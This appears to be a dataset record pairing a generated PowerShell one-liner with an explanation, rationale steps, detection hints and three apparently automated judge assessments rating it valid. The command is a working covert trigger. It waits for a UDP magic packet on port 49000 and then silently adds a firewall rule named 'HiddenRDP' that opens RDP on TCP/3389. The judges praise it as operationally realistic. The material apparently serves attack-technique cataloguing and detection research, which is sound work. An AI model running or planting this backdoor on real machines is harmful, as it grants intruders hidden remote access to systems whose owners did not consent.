command: $port=49000;$magic='CA-FE-BA-BE-00-01';$u=New-Object System.Net.Sockets.UdpClient($port);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);while($true){$buf=$u.Receive([ref]$ep);if([BitConverter]::ToString($buf) -eq $magic){& netsh advfirewall firewall add rule name='HiddenRDP' dir=in action=allow protocol=TCP localport=3389;break}}
explanation: Listens for a specific UDP magic packet (CA-FE-BA-BE-00-01) on port 49000. Upon receipt, it opens an inbound Windows Firewall rule for RDP (TCP/3389), enabling access only after the covert signal. Requires elevated PowerShell (UAC) because it modifies firewall rules via netsh.
rationale_steps: Open a UDP listener on a high port to await a secret magic packet.
When the exact magic bytes arrive, use netsh to add an inbound firewall rule opening TCP/3389.
Detection: monitor Security Event IDs 4946/4947 (firewall rule changes), Sysmon EID 1 for netsh.exe invocation, and unusual UDP packets to high ports with fixed payloads.

llm_judgments.syntactic_justification: Well-formed PowerShell one-liner with balanced braces/quotes, valid [ref] usage for UdpClient.Receive, and correct invocation of netsh via the call operator.
llm_judgments.semantic_justification: It implements a UDP magic-packet trigger to covertly enable an RDP firewall rule, aligning with T1205 traffic signaling and is operationally plausible assuming elevation as noted.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced parentheses, proper variable assignments, correct .NET class instantiation, valid string comparisons, and proper semicolon separators throughout.
llm_judgments.semantic_justification: The command precisely implements a port-knocking/magic-packet traffic signaling mechanism (T1205) by listening on UDP port 49000 for a specific 6-byte magic sequence (CA-FE-BA-BE-00-01), then triggering a firewall rule to open RDP access — a classic covert trigger-based C2 activation pattern that is operationally realistic and correctly uses BitConverter for byte comparison and netsh for firewall modification.

llm_judgments.syntactic_justification: The command uses valid PowerShell syntax, correctly instantiates .NET objects, handles the reference parameter for the socket, and contains no structural errors.
llm_judgments.semantic_justification: The script perfectly implements a port-knocking/traffic signaling mechanism by listening for a specific UDP byte sequence to trigger a firewall modification, which matches the T1205 technique description.
